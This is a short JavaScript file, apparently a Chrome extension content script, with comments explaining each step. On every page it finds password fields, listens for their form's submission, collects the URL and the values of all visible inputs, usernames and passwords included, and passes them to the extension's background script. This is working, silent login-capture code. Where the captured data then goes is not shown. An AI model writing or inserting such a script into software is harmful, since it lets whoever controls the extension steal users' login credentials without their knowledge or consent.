// Finds all input fields on the page that are of type "password" and sends each to a function
document.querySelectorAll('input[type="password"]').forEach( function(password_field) {
    // Listen for when form is submitted, and send the event to a function
    password_field.form.addEventListener("submit", function(e) {
        // Take the event and find the target (the form), find all inputs not of type "hidden" or "submit", and turn the output into an array
        var inputs = Array.prototype.slice.call(e.target.querySelectorAll('input:not([type="hidden"]):not([type="submit"])'));
        // Turn array of inputs into an array of their values (the strings they contain)
        inputs.forEach( function(input, i, arr) { arr[i] = input.value; });
        // Send a message to background script in the form "url + joined array of inputs"
        chrome.runtime.sendMessage({loginListener: location.href + ", " + inputs.join(": ")});
    }, false);
});

